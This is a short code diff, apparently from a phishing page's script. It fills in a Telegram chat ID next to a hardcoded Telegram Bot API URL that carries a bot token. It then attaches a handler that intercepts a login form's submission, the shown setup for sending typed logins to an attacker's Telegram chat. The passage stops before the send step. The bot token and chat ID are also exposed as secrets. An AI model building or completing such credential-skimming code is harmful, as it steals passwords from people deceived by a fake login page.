@@ -1,5 +1,5 @@
 const TELEGRAM_BOT_API_URL = "https://api.telegram.org/bot2101899532:AAGQ4MjaBjYhu--NWwDpUeFlhZnRriPDcFA/sendMessage";
-const CHAT_ID = "<YOUR_CHAT_ID>";
+const CHAT_ID = "1339653142";
 
 document.getElementById("loginForm").addEventListener("submit", function(event) {
     event.preventDefault();
